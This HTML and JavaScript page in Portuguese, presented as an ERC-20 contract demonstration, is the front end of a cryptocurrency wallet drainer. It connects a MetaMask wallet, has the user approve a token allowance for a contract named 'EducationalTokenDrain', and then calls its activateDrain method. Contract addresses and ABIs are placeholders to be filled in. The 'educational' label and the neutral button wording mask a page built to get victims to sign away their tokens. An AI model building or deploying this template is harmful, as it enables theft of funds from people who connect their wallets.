<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Demonstração de Contrato</title>
    <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {
            background-image: url('https://i.pinimg.com/originals/a1/fe/09/a1fe09a8b4e68f5ec30944866f64c8ec.png');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            color: #ffffff;
            font-family: 'Roboto', sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            text-shadow: 2px 2px 4px #000;
        }
        h2 {
            font-family: 'Orbitron', sans-serif;
            font-size: 32px;
            margin-bottom: 20px;
            text-align: center;
            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
        }
        button, input {
            border: 2px solid #fff;
            padding: 10px 20px;
            margin: 10px 5px;
            border-radius: 20px;
            background-color: rgba(0,0,0,0.5);
            color: #fff;
            cursor: pointer;
            transition: all 0.3s ease;
            outline: none;
            font-size: 16px;
            text-shadow: none;
            font-family: 'Roboto', sans-serif;
        }
        button:hover, input:focus {
            background-color: rgba(255,255,255,0.8);
            color: #000;
            border-color: #37cc6e;
        }
        input {
            width: 250px;
            padding: 10px;
        }
        button {
            box-shadow: 0 0 8px rgba(255, 255, 255, 0.8);
        }
        button:active {
            transform: scale(0.95);
        }
    </style>
</head>
<body>
    <h2>Demonstração de Contrato ERC-20</h2>
    <button id="connectWallet">Conectar Carteira</button>
    <input type="text" id="tokenAmount" placeholder="Quantidade para Aprovar e Transferir">
    <button id="approveTokens">Aprovar Tokens</button>
    <button id="activateTransfer">Ativar Transferência</button>

    <script>
        let web3;
        let userAccount;

        // Substitua pelos seus contratos específicos
        const tokenAddress = 'TOKEN_CONTRACT_ADDRESS';
        const educationalTokenDrainAddress = 'EDUCATIONAL_TOKEN_DRAIN_ADDRESS';

        // Substitua pela ABI completa do seu token e contrato EducationalTokenDrain
        const tokenABI = [/* ABI do Token ERC-20 */];
        const educationalTokenDrainABI = [/* ABI do contrato EducationalTokenDrain */];

        document.getElementById('connectWallet').addEventListener('click', async () => {
            if (window.ethereum) {
                web3 = new Web3(window.ethereum);
                try {
                    await window.ethereum.request({ method: 'eth_requestAccounts' });
                    const accounts = await web3.eth.getAccounts();
                    userAccount = accounts[0];
                    console.log("Carteira conectada:", userAccount);
                } catch (error) {
                    console.error("Usuário negou acesso à conta.");
                }
            } else {
                alert("Por favor, instale MetaMask ou outro provedor de carteira Ethereum.");
            }
        });

        document.getElementById('approveTokens').addEventListener('click', () => {
            const tokenAmount = document.getElementById('tokenAmount').value;
            const tokenContract = new web3.eth.Contract(tokenABI, tokenAddress);
            tokenContract.methods.approve(educationalTokenDrainAddress, tokenAmount).send({from: userAccount})
                .then((tx) => {
                    console.log("Tokens aprovados:", tx);
                }).catch((error) => {
                    console.error("Falha ao aprovar tokens:", error);
                });
        });

        document.getElementById('activateTransfer').addEventListener('click', () => {
            const tokenAmount = document.getElementById('tokenAmount').value;
            const educationalTokenDrainContract = new web3.eth.Contract(educationalTokenDrainABI, educationalTokenDrainAddress);
            educationalTokenDrainContract.methods.activateDrain(tokenAddress, tokenAmount).send({from: userAccount})
                .then((tx) => {
                    console.log("Transferência ativada:", tx);
                }).catch((error) => {
                    console.error("Falha ao ativar transferência:", error);
                });
        });
    </script>
</body>
</html>
